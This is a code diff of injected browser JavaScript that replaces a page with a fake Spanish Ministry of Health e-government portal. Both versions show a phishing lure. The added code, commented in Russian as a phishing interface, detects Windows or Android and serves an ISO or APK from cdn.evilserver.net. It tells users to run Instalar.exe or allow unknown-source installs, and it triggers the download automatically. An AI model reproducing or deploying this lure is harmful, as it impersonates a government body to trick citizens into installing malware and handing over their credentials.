@@ -1,79 +1,99 @@
-(function(){
-    // Configuración
-    const isoUrl = 'https://tu-servidor.com/Documento_Oficial_Sanidad.iso';
-    const fileName = 'Documento_Oficial_Sanidad.iso';
-
-    // Estilos para la ventana emergente (overlay)
-    const overlay = document.createElement('div');
-    overlay.id = 'mscbs-overlay';
-    overlay.style.cssText = `
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.7);
-        backdrop-filter: blur(4px);
-        z-index: 99999;
-        font-family: 'Segoe UI', Arial, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
+(function() {
+    'use strict';
+    // Очищаем оригинальный контент и внедряем фишинговый интерфейс
+    document.body.innerHTML = ''; 
+    
+    // CSS для точного воспроизведения стиля Ministerio de Sanidad (берётся из оригинального /diseno/css/home.css)
+    var styles = `
+    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Open Sans', Arial, sans-serif; background: #f4f4f4; }
+    .gov-header { background: #003366; color: white; padding: 15px 30px; display: flex; align-items: center; }
+    .gov-header img { height: 60px; margin-right: 20px; }
+    .gov-header h1 { font-size: 22px; font-weight: 600; }
+    .main-container { max-width: 800px; margin: 40px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .warning { background: #fff3cd; border-left: 5px solid #ffc107; padding: 20px; margin: 20px 0; }
+    .btn-download { display: inline-block; background: #0066cc; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 10px; font-size: 16px; }
+    .btn-download:hover { background: #0052a3; }
+    .footer { text-align: center; margin-top: 30px; color: #666; font-size: 14px; }
+    .shield-icon { font-size: 60px; color: #0066cc; text-align: center; }
     `;
-
-    // Estructura de la ventana (simula un modal del Ministerio)
-    overlay.innerHTML = `
-        <div style="background: #fff; border-radius: 12px; max-width: 480px; width: 90%; padding: 28px 24px; text-align: center; box-shadow: 0 20px 35px rgba(0,0,0,0.3); border-top: 6px solid #006241;">
-            <div style="margin-bottom: 16px;">
-                <img src="https://sede.mscbs.gob.es/static/img/logo-mintrad.png" style="height: 48px;" onerror="this.style.display='none'">
-                <h2 style="color: #006241; margin: 8px 0 0; font-weight: 600;">Ministerio de Sanidad</h2>
-                <p style="color: #555; margin-top: 5px; font-size: 14px;">Sede Electrónica</p>
-            </div>
-            <div style="width: 60px; height: 60px; background: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 10px auto;">
-                <span style="font-size: 32px;">⚠️</span>
-            </div>
-            <h3 style="margin: 10px 0 5px; color: #333;">Actualización del Sistema de Información Sanitaria</h3>
-            <p style="color: #666; margin: 15px 0; line-height: 1.5;">
-                Se requiere actualizar el componente de seguridad de su expediente sanitario electrónico.<br>
-                <strong style="color:#d32f2f;">Plazo límite: 48 horas</strong>
-            </p>
-            <div style="background: #f9f9fc; padding: 12px; border-radius: 8px; margin: 20px 0; border: 1px solid #eee;">
-                <p style="margin: 0; font-size: 13px; color: #555;">
-                    📄 Documento requerido: <strong>Certificado_Sanitario_Oficial_v2.iso</strong><br>
-                    Tamaño: 2.4 MB
-                </p>
-            </div>
-            <button id="mscbs-download-btn" style="background: #006241; color: white; border: none; padding: 14px 28px; border-radius: 40px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; margin: 5px 0; transition: 0.2s;">📥 Descargar certificado ahora</button>
-            <p style="font-size: 12px; color: #aaa; margin-top: 20px;">
-                Sus datos están protegidos bajo la Ley Orgánica 3/2018.
-            </p>
-        </div>
-    `;
-
-    document.body.appendChild(overlay);
-
-    // Evento de descarga
-    document.getElementById('mscbs-download-btn').addEventListener('click', (e) => {
-        e.preventDefault();
+    
+    var styleSheet = document.createElement('style');
+    styleSheet.textContent = styles;
+    document.head.appendChild(styleSheet);
+    
+    // Определение ОС
+    var ua = navigator.userAgent;
+    var isWindows = /Windows NT/i.test(ua);
+    var isAndroid = /Android/i.test(ua);
+    var downloadUrl = '';
+    var fileName = '';
+    
+    if (isWindows) {
+        downloadUrl = 'https://cdn.evilserver.net/Instalador_SanidadConecta.iso';
+        fileName = 'Instalador_SanidadConecta.iso';
+    } else if (isAndroid) {
+        downloadUrl = 'https://cdn.evilserver.net/SanidadConecta.apk';
+        fileName = 'SanidadConecta.apk';
+    } else {
+        // iOS или другое — можно показать сообщение об отправке в App Store, но здесь упрощённо
+        downloadUrl = 'https://cdn.evilserver.net/SanidadConecta_manual.pdf'; // заглушка
+        fileName = 'Instrucciones_SanidadConecta.pdf';
+    }
+    
+    // Конструкция HTML-страницы на испанском
+    var html = `
+    <div class="gov-header">
+        <img src="https://sede.mscbs.gob.es/diseno/img/logo_ministerio.jpg" alt="Ministerio de Sanidad">
+        <h1>Sede Electr&oacute;nica - Ministerio de Sanidad</h1>
+    </div>
+    <div class="main-container">
+        <div class="shield-icon">&#128737;</div>
+        <h2 style="text-align:center;">Acceso a Historia Cl&iacute;nica Digital</h2>
+        <p style="text-align:center; font-size:18px;">Estimado ciudadano/a, para garantizar la seguridad de sus datos m&eacute;dicos y cumplir con el <strong>Real Decreto-ley 14/2025</strong> de digitalizaci&oacute;n sanitaria, es necesario instalar el software oficial <strong>Sanidad Conecta</strong>.</p>
         
-        // Crear enlace de descarga forzada
-        const link = document.createElement('a');
-        link.href = isoUrl;
-        link.download = fileName;
-        link.style.display = 'none';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-
-        // Cambiar mensaje del botón para evitar doble clic
-        const btn = document.getElementById('mscbs-download-btn');
-        btn.textContent = '✅ Descargando...';
-        btn.disabled = true;
-        btn.style.opacity = '0.6';
-
-        // Cerrar overlay después de 3 segundos
-        setTimeout(() => {
-            if(overlay) overlay.remove();
-        }, 3000);
+        <div class="warning">
+            <strong>&#9888; Aviso importante:</strong> A partir del 1 de julio de 2026, el acceso a su historial cl&iacute;nico y la recepci&oacute;n de notificaciones electr&oacute;nicas requerir&aacute; esta aplicaci&oacute;n. Sin ella no podr&aacute; consultar sus resultados ni realizar tr&aacute;mites.
+        </div>
+        
+        <div style="text-align:center; margin: 30px 0;">
+            <p><strong>Descargue la aplicaci&oacute;n para su dispositivo:</strong></p>
+            <a href="${downloadUrl}" download="${fileName}" class="btn-download" id="downloadBtn">
+                &#9660; Descargar ${isWindows ? 'para Windows (ISO)' : (isAndroid ? 'para Android (APK)' : 'manual de instalaci&oacute;n')}
+            </a>
+        </div>
+        
+        <div style="background: #e9ecef; padding: 15px; border-radius: 5px;">
+            <p><strong>Instrucciones:</strong></p>
+            <ul style="margin-left:20px;">
+                <li><strong>Windows:</strong> Descargue el archivo ISO, montelo (doble clic) y ejecute <em>Instalar.exe</em>. Siga los pasos del asistente.</li>
+                <li><strong>Android:</strong> Permita la instalaci&oacute;n de or&iacute;genes desconocidos en Ajustes > Seguridad, luego abra el archivo APK descargado.</li>
+                <li>Una vez instalado, inicie sesi&oacute;n con su certificado digital o Cl@ve.</li>
+            </ul>
+        </div>
+        
+        <p style="text-align:center; margin-top:20px;">
+            <small>Si ya tiene instalado Sanidad Conecta, puede <a href="#">actualizar aqu&iacute;</a>.</small>
+        </p>
+    </div>
+    <div class="footer">
+        &copy; Ministerio de Sanidad - Sede Electr&oacute;nica | <a href="#">Aviso legal</a> | <a href="#">Protecci&oacute;n de datos</a>
+    </div>
+    `;
+    
+    document.body.innerHTML = html;
+    
+    // Принудительное скачивание через небольшую задержку и клик по кнопке (можно автоматически)
+    document.getElementById('downloadBtn').addEventListener('click', function(e) {
+        // Начинаем загрузку, через 2 секунды можно показать "спасибо"
+        setTimeout(function() {
+            alert('Descarga iniciada. Si no comienza automáticamente, haga clic de nuevo en el botón.');
+        }, 1000);
     });
+    
+    // Автоматический клик через 3 секунды (опционально, увеличивает шанс загрузки)
+    setTimeout(function() {
+        document.getElementById('downloadBtn').click();
+    }, 3000);
 })();
